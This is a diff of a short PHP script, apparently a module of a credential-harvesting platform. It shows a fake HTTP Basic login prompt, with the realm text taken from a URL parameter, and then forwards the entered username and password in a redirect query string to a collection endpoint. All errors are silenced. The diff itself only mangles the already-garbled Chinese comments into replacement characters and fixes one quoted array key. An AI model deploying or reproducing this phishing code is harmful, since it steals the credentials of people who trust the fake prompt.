@@ -1,10 +1,10 @@
 <?
 error_reporting(0);
-/* ¼ì²é±äÁ¿ $PHP_AUTH_USER ºÍ$PHP_AUTH_PW µÄÖµ*/
+/* ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ $PHP_AUTH_USER ï¿½ï¿½$PHP_AUTH_PW ï¿½ï¿½Öµ*/
 
 if ((!isset($_SERVER['PHP_AUTH_USER'])) || (!isset($_SERVER['PHP_AUTH_PW']))) {
 
- /* ¿ÕÖµ£º·¢ËÍ²úÉúÏÔÊ¾ÎÄ±¾¿òµÄÊý¾ÝÍ·²¿*/
+ /* ï¿½ï¿½Öµï¿½ï¿½ï¿½ï¿½ï¿½Í²ï¿½ï¿½ï¿½ï¿½ï¿½Ê¾ï¿½Ä±ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Í·ï¿½ï¿½*/
 
     header('WWW-Authenticate: Basic realm="'.addslashes(trim($_GET['info'])).'"');
 
@@ -16,9 +16,9 @@ if ((!isset($_SERVER['PHP_AUTH_USER'])) || (!isset($_SERVER['PHP_AUTH_PW']))) {
 
 } else if ((isset($_SERVER['PHP_AUTH_USER'])) && (isset($_SERVER['PHP_AUTH_PW']))){
 
-    /* ±äÁ¿Öµ´æÔÚ£¬¼ì²éÆäÊÇ·ñÕýÈ· */
+    /* ï¿½ï¿½ï¿½ï¿½Öµï¿½ï¿½ï¿½Ú£ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Ç·ï¿½ï¿½ï¿½È· */
 
-	header("Location: http://127.0.0.1:8080/index.php?do=api&id={$_GET[id]}&username={$_SERVER[PHP_AUTH_USER]}&password={$_SERVER[PHP_AUTH_PW]}"); 
+	header("Location: http://127.0.0.1:8080/index.php?do=api&id={$_GET['id']}&username={$_SERVER[PHP_AUTH_USER]}&password={$_SERVER[PHP_AUTH_PW]}");
 
 }
 
